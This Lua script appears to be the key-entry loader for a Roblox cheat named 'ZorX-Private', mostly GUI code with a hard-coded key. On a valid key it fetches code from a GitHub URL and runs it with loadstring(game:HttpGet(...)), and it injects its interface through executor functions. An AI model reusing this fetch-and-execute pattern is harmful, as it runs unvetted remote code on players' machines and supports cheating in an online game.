local Player = Players.LocalPlayer

local isVerifying = false

local function ValidateKey(inputKey, validKeys)
    for _, validKey in pairs(validKeys) do
        if inputKey == validKey then
            return true
        end
    end
    return false
end

local function Create(className, properties, parent)
    local instance = Instance.new(className)
    for property, value in pairs(properties) do
        instance[property] = value
    end
    if parent then
        instance.Parent = parent
    end
    return instance
end

function KeySystem:CreateKeySystem(Config)
    local Title = "ZorX-Private"
    local Description = Config.Description or "Enter Your Key"
    local Keys = Config.Keys or {}
    
    local MainScriptCallback = Config.MainScriptCallback or function(success)
        if success then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ZorXllll/Muscle-Legends-llll/refs/heads/main/ZorX-Private"))()
        end
    end

    local DarkColor = Color3.fromRGB(15, 15, 15)
    local DarkerColor = Color3.fromRGB(5, 5, 5)
    local AccentColor = Color3.fromRGB(255, 255, 255)
    local PureBlack = Color3.fromRGB(0, 0, 0)

    local KeySystemGui = Create("ScreenGui", {
        ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
        IgnoreGuiInset = true,
        Name = "KeySystemGui"
    }, RunService:IsStudio() and Player.PlayerGui or 
       (gethui and gethui() or game:GetService("CoreGui")))

    local BlurBackground = Create("Frame", {
        BackgroundColor3 = PureBlack,
        BackgroundTransparency = 0.4,
        BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 1, 0),
        Position = UDim2.new(0, 0, 0, 0),
        Name = "BlurBackground"
    }, KeySystemGui)

    -- Floating Bubbles Container
    local BubblesHolder = Create("Frame", {
        BackgroundTransparency = 1,
        Size = UDim2.new(1, 0, 1, 0),
        Name = "BubblesHolder"
    }, BlurBackground)

    -- Generate floating bubble particles
    task.spawn(function()
        math.randomseed(tick())
        while KeySystemGui.Parent do
            task.wait(0.8)
            if not KeySystemGui.Parent then break end
            
            local size = math.random(9, 25)
            local posX = math.random(5, 95) / 100
            
            local bubble = Create("Frame", {
                BackgroundColor3 = Color3.fromRGB(255, 255, 255),
                BackgroundTransparency = math.random(60, 85) / 100,
                BorderSizePixel = 0,
                Position = UDim2.new(posX, 0, 1.1, 0),
                Size = UDim2.new(0, size, 0, size),
                Name = "Bubble"
            }, BubblesHolder)

            Create("UICorner", {CornerRadius = UDim.new(1, 0)}, bubble)

            local speed = math.random(4, 8)
            local targetX = posX + (math.random(-10, 10) / 100)
            
            local tween = TweenService:Create(bubble, TweenInfo.new(speed, Enum.EasingStyle.Linear), {
                Position = UDim2.new(targetX, 0, -0.1, 0),
                BackgroundTransparency = 1
            })
            
            tween:Play()
            tween.Completed:Connect(function()
                bubble:Destroy()
            end)
        end
    end)

    -- Glowing Background Aura Effect
    local GlowEffect = Create("Frame", {
        AnchorPoint = Vector2.new(0.5, 0.5),
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = 0.85,
        BorderSizePixel = 0,
        Position = UDim2.new(0.5, 0, 0.5, 0),
        Size = UDim2.new(0, 460, 0, 410),
        Name = "GlowEffect"
    }, BlurBackground)

    Create("UICorner", {CornerRadius = UDim.new(0, 26)}, GlowEffect)

    local glowTween = TweenService:Create(GlowEffect, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
        BackgroundTransparency = 0.95,
        Size = UDim2.new(0, 490, 0, 440)
    })
    glowTween:Play()

    -- Katamtamang Laki ng KeyContainer Box (440 width x 380 height)
    local KeyContainer = Create("Frame", {
        AnchorPoint = Vector2.new(0.5, 0.5),
        BackgroundColor3 = PureBlack,
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        Position = UDim2.new(0.5, 0, 0.5, 0),
        Size = UDim2.new(0, 440, 0, 380),
        Name = "KeyContainer"
    }, BlurBackground)

    Create("UICorner", {CornerRadius = UDim.new(0, 22)}, KeyContainer)

    Create("UIStroke", {
        Color = AccentColor,
        Thickness = 2,
        Transparency = 0.5,
        ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    }, KeyContainer)

    local CloseButton = Create("TextButton", {
        Font = Enum.Font.GothamBold,
        Text = "X",
        TextColor3 = Color3.fromRGB(200, 200, 200),
        TextSize = 18,
        BackgroundColor3 = DarkColor,
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        Position = UDim2.new(1, -40, 0, 10),
        Size = UDim2.new(0, 30, 0, 30),
        Name = "CloseButton"
    }, KeyContainer)

    Create("UICorner", {CornerRadius = UDim.new(0, 8)}, CloseButton)

    Create("TextLabel", {
        Font = Enum.Font.GothamBold,
        Text = Title,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextSize = 30,
        BackgroundTransparency = 1,
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.new(0.5, 0, 0, 44),
        Size = UDim2.new(0, 360, 0, 45),
        TextXAlignment = Enum.TextXAlignment.Center,
        Name = "TitleLabel"
    }, KeyContainer)

    Create("TextLabel", {
        Font = Enum.Font.Gotham,
        Text = Description,
        TextColor3 = Color3.fromRGB(180, 180, 180),
        TextSize = 15,
        TextWrapped = true,
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 25, 0, 82),
        Size = UDim2.new(1, -50, 0, 38),
        TextXAlignment = Enum.TextXAlignment.Center,
        Name = "DescLabel"
    }, KeyContainer)

    local InputFrame = Create("Frame", {
        BackgroundColor3 = DarkColor,
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        Position = UDim2.new(0, 25, 0, 132), 
        Size = UDim2.new(1, -50, 0, 48),
        Name = "InputFrame"
    }, KeyContainer) 

    Create("UICorner", {CornerRadius = UDim.new(0, 12)}, InputFrame)

    Create("UIStroke", {
        Color = AccentColor,
        Thickness = 1.5,
        Transparency = 0.7
    }, InputFrame)

    local KeyInput = Create("TextBox", {
        Font = Enum.Font.Gotham,
        PlaceholderText = "Enter Access Key",
        PlaceholderColor3 = Color3.fromRGB(100, 100, 100),
        Text = "",
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextSize = 15,
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 15, 0, 0),
        Size = UDim2.new(1, -30, 1, 0),
        TextXAlignment = Enum.TextXAlignment.Left,
        ClearTextOnFocus = false,
        Name = "KeyInput"
    }, InputFrame)

    local ButtonsFrame = Create("Frame", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 25, 0, 196),
        Size = UDim2.new(1, -50, 0, 95),
        Name = "ButtonsFrame"
    }, KeyContainer)

    local function createEnhancedButton(properties, parent)
        local button = Create("TextButton", properties, parent)
        Create("UICorner", {CornerRadius = UDim.new(0, 10)}, button)
        return button
    end

    local GetKeyButton = createEnhancedButton({
        Font = Enum.Font.GothamBold,
        Text = "Get Key",
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextSize = 16,
        BackgroundColor3 = DarkColor,
        BackgroundTransparency = 0.05,
        BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 0, 40),
        Name = "GetKeyButton"
    }, ButtonsFrame)

    GetKeyButton.Activated:Connect(function()
        local discordLink = "ULOL"
        if setclipboard then
            setclipboard(discordLink)
        end
    end)

    local MainScript = createEnhancedButton({
        Font = Enum.Font.GothamBold,
        Text = "Enter Access Key",
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextSize = 16,
        BackgroundColor3 = DarkerColor,
        BackgroundTransparency = 0.05,
        BorderSizePixel = 0,
        Position = UDim2.new(0, 0, 0, 48),
        Size = UDim2.new(1, 0, 0, 40),
        Name = "MainScript"
    }, ButtonsFrame)

    local StatusLabel = Create("TextLabel", {
        Font = Enum.Font.GothamBold,
        Text = "",
        TextColor3 = Color3.fromRGB(200, 200, 200),
        TextSize = 14,
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Position = UDim2.new(0, 25, 0, 312),
        Size = UDim2.new(1, -50, 0, 25),
        TextXAlignment = Enum.TextXAlignment.Center,
        Visible = false,
        Name = "StatusLabel"
    }, KeyContainer)

    local function verifyKey()
        if isVerifying then return end
        isVerifying = true

        local inputKey = KeyInput.Text

        if inputKey == "" then
            StatusLabel.Text = "Please enter a key."
            StatusLabel.Visible = true
            task.wait(1.5)
            StatusLabel.Visible = false
            isVerifying = false
            return
        end

        if ValidateKey(inputKey, Keys) then
            StatusLabel.Text = "Valid Key!"
            StatusLabel.Visible = true

            task.wait(1)
            KeySystemGui:Destroy()
            MainScriptCallback(true)
        else
            StatusLabel.Text = "Invalid Key."
            StatusLabel.Visible = true
            task.wait(1.5)
            StatusLabel.Visible = false
            isVerifying = false
        end
    end

    MainScript.Activated:Connect(verifyKey)
    KeyInput.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            verifyKey()
        end
    end)

    CloseButton.Activated:Connect(function()
        KeySystemGui:Destroy()
    end)

    return KeySystem
end

KeySystem:CreateKeySystem({
    Description = "Enter Your Key",
    Keys = {"zorx123"}
})
